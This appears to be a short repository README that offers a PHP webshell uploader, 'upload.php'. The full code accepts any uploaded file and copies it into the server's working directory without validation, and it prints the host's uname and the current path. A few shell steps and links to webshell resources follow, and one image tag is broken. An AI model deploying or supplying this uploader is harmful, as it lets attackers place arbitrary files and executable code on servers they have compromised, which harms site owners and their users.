# webshell simple upload.php.

<img style="float:left" alt="route logo" src="https://github.com/hackingyseguridad/webshell/blob/master/webshell.png"> 


vim upload.php

<center><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">
<center><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form></center>
<?php if( $_POST['_upl'] == "Upload" ) { if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo 'Done !!'; } else { echo 'Failed :('; }} 
echo "<center><br><b>".php_uname()."</b><br></center>";
echo "<center><p><br><b>".getcwd()."</b><br></p></center>";
?>

cd ..

chmod +r carpeta

cd carpeta


img style="float:left" alt="route logo" src="https://github.com/hackingyseguridad/webshell/blob/master/shell.png"> 


http://deepshells.com/

https://github.com/xl


